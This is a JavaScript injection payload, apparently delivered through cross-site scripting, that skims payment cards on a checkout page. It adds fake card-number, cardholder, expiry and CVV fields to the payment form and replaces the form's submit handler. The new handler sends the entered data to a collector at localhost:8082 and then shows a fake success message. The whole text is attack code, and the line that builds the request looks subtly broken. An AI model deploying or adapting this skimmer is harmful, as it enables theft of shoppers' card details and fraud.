//alert(document.domain)

document.getElementById('customer-email').value=''

try {
document.getElementById('xxxx').remove();
} catch (e){}
for (let text of ['Card number', 'Card Holder', 'Expiration Date', 'CVV']) {
    const elementWrap = document.createElement('div');
    elementWrap.classList.add('element-wrap');
    const elementLabel = document.createElement('div');
    elementLabel.classList.add('element-label');
    const labelSpan = document.createElement('span');
    labelSpan.textContent = text;
    const inputElement = document.createElement('input');
    inputElement.id = text.toLowerCase().replace(/\s+/g, '-');
    inputElement.type = 'text';
    inputElement.classList.add('element-is-input');
    inputElement.required = true;
    inputElement.value = '';
    elementLabel.appendChild(labelSpan);
    elementWrap.appendChild(elementLabel);
    elementWrap.appendChild(inputElement);
    const parentElement = document.getElementById('payment-form');
    parentElement.insertBefore(elementWrap, document.querySelector('.element-wrap-for-submit'))
}

const element = document.getElementById('payment-form');
const clonedElement = element.cloneNode(true);
element.parentNode.replaceChild(clonedElement, element);

$('#payment-form input').each(function() {
  var id = $(this).attr('id');
  $(this).attr('name', id);
});

function handleSubmit(event) {
    event.preventDefault();
    const form = document.getElementById('payment-form');
    const formData = new FormData(form);

    const xhr = new XMLHttpRequest();

    xhr.open('GET', 'http://localhost:8082'+"?"+formData, true);
    xhr.onload = function() {
    if (xhr.status === 200) {
      console.log('Payment processed successfully.');
      document.getElementById('payment-form').classList = 'hidden'
      document.getElementById('payment-success').classList = "payment-success animated fadeIn text-center"
    } else {
      console.log('Error processing payment.');
    }
  };
  xhr.send(null);
}

document.getElementById('payment-form').addEventListener('submit', handleSubmit);
